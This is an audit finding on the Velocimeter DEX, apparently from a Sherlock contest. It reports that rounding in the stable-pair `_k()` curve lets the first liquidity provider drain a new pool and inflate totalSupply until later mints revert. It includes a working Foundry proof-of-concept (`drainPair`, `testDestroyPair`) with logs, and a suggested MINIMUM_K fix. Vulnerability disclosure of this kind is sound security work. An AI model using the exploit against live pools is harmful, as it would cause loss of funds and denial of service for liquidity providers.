Sweet Pecan Wasp

High

# First liquidity provider of a newly created stable pair can cause DOS and loss of funds

## Summary

`Pair::_k()` stable pair curve is susceptible to rounding down `_a` towards 0. This breaks the curve's invariant check during the `swap()` function, which allows the first user of a newly created pool to drain the pool and to inflate the total supply to cause overflow for future depositors.

## Vulnerability Detail
[Pair::_k()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L403-L413)
```solidity
    function _k(uint x, uint y) internal view returns (uint) {
        if (stable) {
            uint _x = x * 1e18 / decimals0;
            uint _y = y * 1e18 / decimals1;
            uint _a = (_x * _y) / 1e18;
            uint _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18);
            return _a * _b / 1e18;  // x3y+y3x >= k
        } else {    
            return x * y; // xy >= k
        }
    }
```
`Pair::_k` contains two different curves:
`x3y+y3x` for stable pairs.
`x * y` for volatile pairs.

The stable pair curve calculation is susceptible to rounding down to 0 if `_x *_y < 1e18` which will cause the return value of `k` to be `0`.

This allows the first user to transfer amounts of tokenA and tokenB that multiplied are less than 1e18, then mint LP tokens.

After this the user can swap most of the balance that they transfered during the mint, without having to worry about the curve invariant check, as `_k()` will return 0 for both calls:
`require(_k(_balance0, _balance1) >= _k(_reserve0, _reserve1), 'K');`

As long as the user transfers 1 token before the swap call to satisfy the `amountIn` check:
`require(amount0In > 0 || amount1In > 0, 'IIA');`

Below is a coded POC to demonstrate the attack that is possible, by transfering, minting and swapping tokens repeatedly, inflating `totalSupply` close to overflow.

Note: This issue was previously reported during an audit of Velodrome: [Link](https://solodit.xyz/issues/first-liquidity-provider-of-a-stable-pair-can-dos-the-pool-spearbit-none-velodrome-finance-pdf)

## POC
Add the following function and test to `Pair.t.sol`:
```solidity
    function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal {
        DAI.transfer(address(pair), 1); // transfer 1 DAI to pass `IIA` require check in swap()
        uint amount0;
        uint amount1;
        if (address(DAI) < address(FRAX)) {
            amount0 = 0;
            amount1 = initialFraxAmount - 1;
        } else {
            amount1 = 0;
            amount0 = initialFraxAmount - 1;
        }
        pair.swap(amount0, amount1, address(this), new bytes(0));
        FRAX.transfer(address(pair), 1); // transfer 1 FRAX to pass `IIA` require check in swap()
        if (address(DAI) < address(FRAX)) {
            amount0 = initialDaiAmount;
            amount1 = 0;
        } else {
            amount1 = initialDaiAmount;
            amount0 = 0;
        }
        pair.swap(amount0, amount1, address(this), new bytes(0));
    }

    function testDestroyPair() public {
        deployCoins();
        deployPairCoins();
        deal(address(DAI), address(this), 100 ether);
        deal(address(FRAX), address(this), 100 ether);

        deployPairFactoryAndRouter();
        //
        gaugeFactory = new GaugeFactory();
        bribeFactory = new BribeFactory();
        gaugePlugin = new GaugePlugin(address(DAI), address(FRAX), address(owner2));
        voter = new Voter(address(escrow), address(factory), address(gaugeFactory), address(bribeFactory), address(gaugePlugin));

        escrow.setVoter(address(voter));
        factory.setVoter(address(voter));
        // Set tx.origin to allow governor check to pass when creating pair
        vm.startPrank(0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496);
        Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true));
        for(uint i = 0; i < 11; i++) {
            DAI.transfer(address(pair), 10_000_000);
            FRAX.transfer(address(pair), 10_000_000);
            uint liquidity = pair.mint(address(this));
            console.log("pair:", address(pair), "liquidity:", liquidity);
            console.log("total liq:", pair.balanceOf(address(this)));
            drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair)));
            console.log("DAI balance:", DAI.balanceOf(address(pair)));
            console.log("FRAX balance:", FRAX.balanceOf(address(pair)));
            require(DAI.balanceOf(address(pair)) == 1, "should drain DAI balance");
            require(FRAX.balanceOf(address(pair)) == 2, "should drain FRAX balance");
        }
        DAI.transfer(address(pair), 10_000_000);
        FRAX.transfer(address(pair), 10_000_000);
        vm.expectRevert();
        pair.mint(address(this));
    }
```
Run command: `forge test --match-test testDestroyPair  -vv`
Output:
```javascript
[PASS] testDestroyPair() (gas: 51917763)
Logs:
  pair: 0x181a7469a02658E0E9b0341cd64B62e5D0C30602 liquidity: 9999000
  total liq: 9999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x181a7469a02658E0E9b0341cd64B62e5D0C30602 liquidity: 50000000000000
  total liq: 50000009999000
  DAI balance: 1
  FRAX balance: 2
 ...SNIP...
  pair: 0x181a7469a02658E0E9b0341cd64B62e5D0C30602 liquidity: 19531281250021875008750002187500350000035000002000000050000000000000
  total liq: 19531285156278125013125003937500787500105000009000000450000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x181a7469a02658E0E9b0341cd64B62e5D0C30602 liquidity: 97656425781390625065625019687503937500525000045000002250000050000000000000
  total liq: 97656445312675781343750032812507875001312500150000011250000500000009999000
  DAI balance: 1
  FRAX balance: 2
```
As seen, one user can cause total liquidity to reach close to the maximum amount near overflow, which will cause any future minting attempts to overflow causing a revert. 

## Impact

This leads to 2 main issues:

### Unable to easily redeploy the pool using pairFactory
The `pairFactory::getPair` mapping will cause redeployment of the pair pool to be impossible without also redeploying the [PairFactory::createPair()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/factories/PairFactory.sol#L108-L124):
```solidity
    function createPair(address tokenA, address tokenB, bool stable) external returns (address pair) {
...SNIP...
        require(getPair[token0][token1][stable] == address(0), 'PE'); // Pair: PAIR_EXISTS - single check is sufficient
...SNIP...
        pair = address(new Pair{salt:salt}());
        getPair[token0][token1][stable] = pair;
        getPair[token1][token0][stable] = pair; // populate mapping in the reverse direction
...SNIP...
    }
```
After the pair has been deployed the `getPair` mapping will be populated for both tokens for the stable pool, and there is no way to clear this pair mapping once it is set.

### DOS of the pair
The `totalSupply` of the Pair contract will be highly inflated, meaning any future users who try to call `mint()` will be unable to do so as the `totalSupply` will overflow, leading to DOS of the contract.

Additionally, there is no real cost to the attack apart from gas costs (which are very low on L2s), meaning any griefer can execute this attack without any financial losses.

## Code Snippet

[Pair::_k()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L403-L413)
[PairFactory::createPair()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/factories/PairFactory.sol#L108-L124):

## Tool used

Manual Review

## Recommendation

Currently `mint()` ensures that the transfered amounts for minting exceed `MINIMUM_LIQUIDITY`:
`liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;`
However is only safe for the `x * y` curve and not for the stable curve `x3y+y3x`.

By adding a similar variable to `MINIMUM_LIQUIDITY` such as `MINIMUM_K` and ensuring the return from `_k()` exceeds this value during minting, this issue should be mitigated:

```diff
    function mint(address to) external lock returns (uint liquidity) {
        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);
        uint _balance0 = IERC20(token0).balanceOf(address(this));
        uint _balance1 = IERC20(token1).balanceOf(address(this));
        uint _amount0 = _balance0 - _reserve0;
        uint _amount1 = _balance1 - _reserve1;

        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;
            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
+           if (stable) {
+                 require(_k(_amount0, _amount1) > MINIMUM_K, "Stable pair below min K");
+           }
        } else {
            liquidity = Math.min(_amount0 * _totalSupply / _reserve0, _amount1 * _totalSupply / _reserve1);
        }
```
